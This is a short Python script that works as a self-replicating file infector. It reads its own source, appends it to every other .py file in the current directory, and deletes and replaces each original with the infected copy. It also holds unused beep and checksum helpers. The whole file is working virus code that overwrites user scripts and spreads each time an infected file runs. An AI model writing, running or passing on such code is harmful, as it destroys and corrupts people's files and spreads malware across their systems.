#!/usr/bin/python
import glob,os,hashlib,winsound


FREQ = 2500  
DUR = 1000  
global i
def Beep(frequency,duration):
    winsound.Beep(frequency, duration)

def create_checksum(filename):
    hasher = hashlib.md5()
    with open(filename,'rb') as file:
        hasher.update(file.read())
    print(hasher.hexdigest())

def infect(PAYLOAD):
    i = 0
    for file in glob.glob("*.py"):
        if file == __file__:
            continue
        f = open(file, "r")
        if f.mode == 'r':
            infected = open('infected_'+str(i)+'.py','w')
            infected.write(f.read() + PAYLOAD)
            f.close()
            infected.close()
            os.remove(file)
            os.rename('infected_'+str(i)+'.py',file)
            i = i + 1
            



with open(__file__,'r') as current_file:
    PAYLOAD = current_file.read()

infect(PAYLOAD)
